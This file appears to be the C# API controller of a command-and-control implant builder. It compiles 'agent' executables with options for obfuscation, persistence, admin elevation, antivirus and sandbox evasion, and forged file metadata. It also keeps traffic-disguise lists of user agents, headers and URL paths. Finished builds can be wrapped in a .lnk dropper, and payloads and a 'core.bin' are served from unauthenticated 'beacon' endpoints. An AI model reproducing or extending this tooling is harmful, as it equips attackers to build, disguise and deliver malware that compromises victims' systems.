using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Models;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/builder")]
[Authorize]
public class BuilderController : ControllerBase
{
    private readonly BuilderBuildService _buildService;
    private readonly BuildListService _lists;
    private readonly TemplateManagerService _templates;

    public BuilderController(BuilderBuildService buildService, BuildListService lists, TemplateManagerService templates)
    {
        _buildService = buildService;
        _lists = lists;
        _templates = templates;
    }

    // ── Icon upload ────────────────────────────────────────────────────

    [HttpPost("upload-icon")]
    public async Task<IActionResult> UploadIcon(IFormFile file, CancellationToken ct)
    {
        if (file == null || file.Length == 0)
            return BadRequest(new { error = "No file provided." });

        var ext = Path.GetExtension(file.FileName).ToLower();
        if (ext != ".ico")
            return BadRequest(new { error = "Only .ico files are supported." });

        if (file.Length > 2 * 1024 * 1024)
            return BadRequest(new { error = "Icon file must be under 2 MB." });

        try
        {
            Directory.CreateDirectory(BuilderBuildService.IconUploadDir);
            var fileName = $"{Guid.NewGuid():N}{ext}";
            var filePath = Path.Combine(BuilderBuildService.IconUploadDir, fileName);
            await using var stream = System.IO.File.Create(filePath);
            await file.CopyToAsync(stream, ct);
            return Ok(new { path = filePath });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    // ── Build mode + template distribution status ───────────────────────

    /// <summary>Builder mode (template/source) and per-platform template cache state.</summary>
    [HttpGet("status")]
    public IActionResult Status() => Ok(new
    {
        mode = BuilderBuildService.TemplateBuildMode ? "template" : "source",
        platforms = BuildPlatforms.All.Select(p =>
        {
            var t = _templates.Info(p);
            return new
            {
                platform = p,
                os = BuilderBuildService.OsOf(p),
                arch = BuilderBuildService.ArchOf(p),
                ext = BuilderBuildService.ModuleExt(p),
                canBuildLocally = BuilderBuildService.FeasibilityError(p) == null,
                template = t == null ? null : new { tag = t.Tag, commit = t.Commit, asset = t.Asset, builtAt = t.BuiltAt, zipBytes = t.ZipBytes },
            };
        }),
    });

    /// <summary>Re-fetch and cache the prebuilt template for one platform (or all).</summary>
    [HttpPost("templates/refresh")]
    public async Task<IActionResult> RefreshTemplates([FromBody] RefreshTemplatesRequest? req, CancellationToken ct)
    {
        var targets = string.IsNullOrWhiteSpace(req?.Platform) ? BuildPlatforms.All : new[] { req!.Platform };
        var results = new List<object>();
        foreach (var platform in targets)
        {
            if (!BuildPlatforms.Specs.ContainsKey(platform))
                return BadRequest(new { error = $"Unsupported platform: {platform}" });
            try
            {
                var t = await _templates.RefreshAsync(platform, log: null, ct);
                results.Add(new { platform, ok = true, tag = t.Tag, commit = t.Commit, asset = t.Asset });
            }
            catch (Exception ex)
            {
                results.Add(new { platform, ok = false, error = ex.Message });
            }
        }
        return Ok(new { results });
    }

    // ── Build (async) ──────────────────────────────────────────────────

    [HttpPost("build")]
    public IActionResult Build([FromBody] BuildConfigRequest req, [FromQuery] bool rebuild = false)
    {
        if (!BuilderBuildService.PlatformOs.ContainsKey(req.Platform))
            return BadRequest(new { error = $"Unsupported platform: {req.Platform}" });
        if (!BuilderBuildService.TemplateBuildMode)
        {
            var feasibility = BuilderBuildService.FeasibilityError(req.Platform);
            if (feasibility != null)
                return BadRequest(new { error = feasibility });
        }

        // Windows-only options are force-reset for non-Windows targets.
        if (BuilderBuildService.PlatformOs[req.Platform] != "windows")
        {
            req.ApplicationType = "Console";
            req.EnableObfuscation = false;
            req.RequireAdmin = false;
            req.EnablePersistence = false;
            req.IconUrl = null;
            req.CompanyName = null;
            req.FileDescription = null;
            req.ProductName = null;
            req.Copyright = null;
            req.FileVersion = null;
            if (req.AntiAnalysis != null)
            {
                req.AntiAnalysis.check_test_signing = false;
                req.AntiAnalysis.enabled = req.AntiAnalysis.check_av_processes;
            }
        }

        var buildId = Guid.NewGuid().ToString("N")[..8];
        var ext = BuilderBuildService.PlatformOs[req.Platform] == "windows" ? ".exe" : "";
        var record = new Models.BuildRecord
        {
            Id = buildId,
            Platform = req.Platform,
            Config = req,
            FileName = $"agent-{req.Platform}-{buildId}{ext}",
            Status = "building",
            CreatedAt = DateTime.UtcNow.ToString("o"),
        };

        // Save initial record
        var history = BuilderBuildService.LoadHistory();
        history.Insert(0, record);
        BuilderBuildService.SaveHistory(history);

        var job = new Models.BuildJob { Record = record };
        BuilderBuildService.ActiveJobs[buildId] = job;

        // Run Rust build in background
        _ = Task.Run(() => _buildService.RunBuildAsync(buildId, req, job, rebuild));

        return Ok(new { buildId });
    }

    /// <summary>
    /// </summary>
    [HttpGet("modules")]
    public IActionResult ListModules([FromQuery] string platform = "x64")
    {
        if (!BuilderBuildService.PlatformOs.ContainsKey(platform))
            return BadRequest(new { error = $"Unsupported platform: {platform}" });

        var dir = BuilderBuildService.ModulesDirFor(platform);
        if (!Directory.Exists(dir))
            return Ok(new { modules = Array.Empty<object>() });

        var ext = BuilderBuildService.ModuleExt(platform);
        var modules = new List<object>();
        foreach (var file in Directory.GetFiles(dir))
        {
            var name = Path.GetFileName(file);
            if (name.EndsWith("." + ext, StringComparison.OrdinalIgnoreCase))
                modules.Add(new { name = BuilderBuildService.CanonicalModuleName(Path.GetFileNameWithoutExtension(name)), enabled = true });
            else if (name.EndsWith("." + ext + ".disable", StringComparison.OrdinalIgnoreCase))
            {
                var stem = Path.GetFileNameWithoutExtension(name[..^".disable".Length]);
                modules.Add(new { name = BuilderBuildService.CanonicalModuleName(stem), enabled = false });
            }
        }
        return Ok(new { modules });
    }

    [HttpPost("modules/toggle")]
    public IActionResult ToggleModule([FromBody] ToggleModuleRequest req)
    {
        if (!BuilderBuildService.PlatformOs.ContainsKey(req.Platform))
            return BadRequest(new { error = $"Unsupported platform: {req.Platform}" });
        if (string.IsNullOrWhiteSpace(req.Name) || req.Name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
            return BadRequest(new { error = "invalid module name" });

        var dir = BuilderBuildService.ModulesDirFor(req.Platform);
        if (!Directory.Exists(dir))
            return NotFound(new { error = "modules directory not found" });

        var ext = BuilderBuildService.ModuleExt(req.Platform);
        var normal = Path.Combine(dir, req.Name + "." + ext);
        var disabled = Path.Combine(dir, req.Name + "." + ext + ".disable");

        if (req.Enabled)
        {
            if (!System.IO.File.Exists(normal) && System.IO.File.Exists(disabled))
                System.IO.File.Move(disabled, normal);
            if (!System.IO.File.Exists(normal))
                return NotFound(new { error = $"module '{req.Name}' not found" });
        }
        else
        {
            if (!System.IO.File.Exists(normal))
                return NotFound(new { error = $"module '{req.Name}' not found (or already disabled)" });
            System.IO.File.Move(normal, disabled);
        }
        return Ok(new { status = "ok", name = req.Name, enabled = req.Enabled });
    }


    [HttpGet("lists")]
    public async Task<IActionResult> GetLists(CancellationToken ct)
    {
        var doc = await _lists.GetAsync(ct);
        return Ok(new
        {
            userAgents = doc.UserAgents,
            extraHeaders = doc.ExtraHeaders,
            pathSuffixes = doc.PathSuffixes,
        });
    }

    [HttpPost("lists/item")]
    public async Task<IActionResult> AddListItem([FromBody] AddBuildListItemRequest req, CancellationToken ct)
    {
        if (string.IsNullOrWhiteSpace(req.Value))
            return BadRequest(new { error = "value is required" });
        if (req.List is not ("userAgents" or "extraHeaders" or "pathSuffixes"))
            return BadRequest(new { error = "invalid list name" });

        var doc = await _lists.AddItemAsync(req.List, req.Value.Trim(), ct);
        return Ok(ToDto(doc));
    }

    [HttpPost("lists/toggle")]
    public async Task<IActionResult> ToggleListItem([FromBody] ToggleBuildListItemRequest req, CancellationToken ct)
    {
        if (req.List is not ("userAgents" or "extraHeaders" or "pathSuffixes"))
            return BadRequest(new { error = "invalid list name" });
        try
        {
            var doc = await _lists.ToggleItemAsync(req.List, req.Id, req.Enabled, ct);
            return Ok(ToDto(doc));
        }
        catch (KeyNotFoundException ex)
        {
            return NotFound(new { error = ex.Message });
        }
    }

    [HttpPost("lists/delete")]
    public async Task<IActionResult> DeleteListItem([FromBody] DeleteBuildListItemRequest req, CancellationToken ct)
    {
        if (req.List is not ("userAgents" or "extraHeaders" or "pathSuffixes"))
            return BadRequest(new { error = "invalid list name" });
        try
        {
            var doc = await _lists.DeleteItemAsync(req.List, req.Id, ct);
            return Ok(ToDto(doc));
        }
        catch (KeyNotFoundException ex)
        {
            return NotFound(new { error = ex.Message });
        }
    }

    private static object ToDto(BuildTrafficLists doc) => new
    {
        userAgents = doc.UserAgents,
        extraHeaders = doc.ExtraHeaders,
        pathSuffixes = doc.PathSuffixes,
    };

    /// <summary>
    /// </summary>
    [HttpPost("modules")]
    public IActionResult BuildModules([FromBody] BuildModulesRequest req)
    {
        if (!BuilderBuildService.PlatformOs.ContainsKey(req.Platform))
            return BadRequest(new { error = $"Unsupported platform: {req.Platform}" });
        if (!BuilderBuildService.TemplateBuildMode)
        {
            var feasibility = BuilderBuildService.FeasibilityError(req.Platform);
            if (feasibility != null)
                return BadRequest(new { error = feasibility });
        }

        var buildId = Guid.NewGuid().ToString("N")[..8];
        var record = new Models.BuildRecord
        {
            Id = buildId,
            Platform = req.Platform,
            Config = new BuildConfigRequest
            {
                Platform = req.Platform,
                EnabledModules = req.EnabledModules,
            },
            FileName = $"modules-{req.Platform}-{buildId}",
            Status = "building",
            CreatedAt = DateTime.UtcNow.ToString("o"),
        };

        var history = BuilderBuildService.LoadHistory();
        history.Insert(0, record);
        BuilderBuildService.SaveHistory(history);

        var job = new Models.BuildJob { Record = record };
        BuilderBuildService.ActiveJobs[buildId] = job;

        _ = Task.Run(async () =>
        {
            try
            {
                var ok = await _buildService.BuildModulesOnlyAsync(req.Platform, req.EnabledModules, job);
                if (ok) job.Complete(0);
                else job.Fail("cloud module build failed");
            }
            catch (Exception ex)
            {
                job.Fail(ex.Message);
            }
            BuilderBuildService.UpdateHistory(job);
        });

        return Ok(new { buildId });
    }

    // ── SSE stream ─────────────────────────────────────────────────────

    [HttpGet("stream/{buildId}")]
    public async Task StreamBuild(string buildId, CancellationToken ct)
    {
        Response.Headers["Content-Type"] = "text/event-stream";
        Response.Headers["Cache-Control"] = "no-cache";
        Response.Headers["Connection"] = "keep-alive";

        if (!BuilderBuildService.ActiveJobs.TryGetValue(buildId, out var job))
        {
            // Build may have already completed — check history
            var history = BuilderBuildService.LoadHistory();
            var record = history.FirstOrDefault(r => r.Id == buildId);
            if (record != null)
            {
                await SseWriteAsync($"data: {JsonSerializer.Serialize(new { type = "status", status = record.Status, error = record.Error })}\n\n", ct);
                await SseWriteAsync("data: {\"type\":\"done\"}\n\n", ct);
            }
            else
            {
                await SseWriteAsync("data: {\"type\":\"error\",\"message\":\"Build not found\"}\n\n", ct);
            }
            return;
        }

        var lastIndex = 0;
        while (!ct.IsCancellationRequested)
        {
            var logs = job.GetLogs();
            while (lastIndex < logs.Count)
            {
                var line = JsonSerializer.Serialize(new { type = "log", text = logs[lastIndex] });
                await SseWriteAsync($"data: {line}\n\n", ct);
                lastIndex++;
            }

            if (job.IsCompleted)
            {
                var statusMsg = JsonSerializer.Serialize(new { type = "status", status = job.Record.Status, error = job.Record.Error });
                await SseWriteAsync($"data: {statusMsg}\n\n", ct);
                await SseWriteAsync("data: {\"type\":\"done\"}\n\n", ct);
                break;
            }

            await Task.Delay(200, ct);
        }
    }

    private async Task SseWriteAsync(string text, CancellationToken ct)
    {
        var bytes = Encoding.UTF8.GetBytes(text);
        await Response.Body.WriteAsync(bytes, ct);
        await Response.Body.FlushAsync(ct);
    }

    // ── History CRUD ───────────────────────────────────────────────────

    [HttpGet("list")]
    public IActionResult List()
    {
        var history = BuilderBuildService.LoadHistory();
        // Don't send full config in list view, just summary
        var items = history.Select(r => new
        {
            r.Id,
            r.Platform,
            r.FileName,
            r.FileSize,
            r.Status,
            r.Error,
            r.CreatedAt,
            r.CompletedAt,
        });
        return Ok(items);
    }

    [HttpGet("info/{buildId}")]
    public IActionResult Info(string buildId)
    {
        var history = BuilderBuildService.LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record == null)
            return NotFound(new { error = "Build not found." });
        return Ok(record);
    }

    [HttpGet("download/{buildId}")]
    public IActionResult Download(string buildId, [FromQuery] string? format)
    {
        var history = BuilderBuildService.LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record == null)
            return NotFound(new { error = "Build not found." });

        var filePath = Path.Combine(BuilderBuildService.OutputBase, buildId, record.FileName);
        if (!System.IO.File.Exists(filePath))
            return NotFound(new { error = "Build file not found on disk." });

        var isWindows = BuilderBuildService.PlatformOs.TryGetValue(record.Platform, out var os) && os == "windows";
        if (isWindows && string.Equals(format, "lnk", StringComparison.OrdinalIgnoreCase))
        {
            var scheme = Request.Scheme;
            var host = Request.Host.Value;
            var url = $"{scheme}://{host}/api/beacon/artifact/{buildId}";
            var bytes = Services.Packaging.BuilderPackageService.CreateLnk(url);
            return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.lnk");
        }

        var stream = System.IO.File.OpenRead(filePath);
        return File(stream, "application/octet-stream", record.FileName);
    }

    /// <summary>
    /// </summary>
    [HttpGet("/api/beacon/artifact/{buildId}")]
    [AllowAnonymous]
    public IActionResult DownloadArtifact(string buildId)
    {
        if (string.IsNullOrWhiteSpace(buildId) || buildId.Any(c => !char.IsAsciiLetterOrDigit(c)))
            return BadRequest(new { error = "invalid build id" });

        var history = BuilderBuildService.LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record == null || record.Status != "completed")
            return NotFound(new { error = "Build not found." });

        var filePath = Path.Combine(BuilderBuildService.OutputBase, buildId, record.FileName);
        if (!System.IO.File.Exists(filePath))
            return NotFound(new { error = "Build file not found on disk." });

        var bytes = System.IO.File.ReadAllBytes(filePath);
        return File(bytes, "application/octet-stream", record.FileName);
    }

    [HttpDelete("{buildId}")]
    public IActionResult DeleteBuild(string buildId)
    {
        // If build is still running, don't allow delete
        if (BuilderBuildService.ActiveJobs.TryGetValue(buildId, out _))
            return BadRequest(new { error = "Cannot delete a build in progress." });

        var history = BuilderBuildService.LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record != null)
        {
            history.Remove(record);
            BuilderBuildService.SaveHistory(history);
        }

        // Clean up files
        var buildDir = Path.Combine(BuilderBuildService.OutputBase, buildId);
        lock (BuilderBuildService.BuildLock)
        {
            try { if (Directory.Exists(buildDir)) Directory.Delete(buildDir, true); }
            catch { /* best effort */ }
        }

        return Ok(new { status = "ok" });
    }

    // ── Template management ─────────────────────────────────────────────

    [HttpDelete("template")]
    public IActionResult ClearTemplate()
    {
        try
        {
            if (Directory.Exists(BuilderBuildService.TemplateDir))
                Directory.Delete(BuilderBuildService.TemplateDir, true);
            return Ok(new { status = "ok", message = "Loader template cleared. Next build will recompile." });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    [HttpGet("template")]
    public IActionResult TemplateStatus()
    {
        var platforms = Directory.Exists(BuilderBuildService.TemplateDir)
            ? Directory.GetDirectories(BuilderBuildService.TemplateDir).Select(d =>
            {
                var file = Directory.GetFiles(d).FirstOrDefault();
                return new
                {
                    platform = Path.GetFileName(d),
                    fileName = file != null ? Path.GetFileName(file) : "",
                    fileSize = file != null ? new FileInfo(file).Length : 0L,
                    updatedAt = file != null ? System.IO.File.GetLastWriteTimeUtc(file).ToString("o") : "",
                };
            }).Where(p => p.fileName != "").ToArray()
            : Array.Empty<object>();

        return Ok(platforms);
    }

    [HttpPost("template/upload")]
    public async Task<IActionResult> UploadTemplate([FromForm] IFormFile file, [FromForm] string platform)
    {
        var validPlatforms = BuilderBuildService.PlatformOs.Keys;
        if (!validPlatforms.Contains(platform))
            return BadRequest(new { error = $"Invalid platform. Must be one of: {string.Join(", ", validPlatforms)}" });

        if (file == null || file.Length == 0)
            return BadRequest(new { error = "No file provided." });

        try
        {
            var platformDir = Path.Combine(BuilderBuildService.TemplateDir, platform);
            Directory.CreateDirectory(platformDir);

            var fileName = BuilderBuildService.PlatformOs[platform] == "windows" ? "loader.exe" : "loader";
            var targetPath = Path.Combine(platformDir, fileName);

            await using (var fs = System.IO.File.Create(targetPath))
            {
                await file.CopyToAsync(fs);
            }

            return Ok(new { status = "ok", platform, fileName, fileSize = file.Length });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    [HttpDelete("template/{platform}")]
    public IActionResult DeleteTemplate(string platform)
    {
        var platformDir = Path.Combine(BuilderBuildService.TemplateDir, platform);
        if (!Directory.Exists(platformDir))
            return NotFound(new { error = $"Template for platform '{platform}' not found." });

        try
        {
            Directory.Delete(platformDir, true);
            return Ok(new { status = "ok" });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    // ── Core DLL delivery ────────────────────────────────────────────────

    [HttpGet("/api/beacon/core/{buildId}")]
    [AllowAnonymous]
    public IActionResult DownloadCore(string buildId)
    {
        var corePath = Path.Combine(BuilderBuildService.OutputBase, buildId, "core.bin");
        if (!System.IO.File.Exists(corePath))
            return NotFound(new { error = "Core not found." });

        var bytes = System.IO.File.ReadAllBytes(corePath);
        return File(bytes, "application/octet-stream", "core.bin");
    }
}

public record BuildModulesRequest(string Platform, List<string>? EnabledModules);

public record ToggleModuleRequest(string Platform, string Name, bool Enabled);
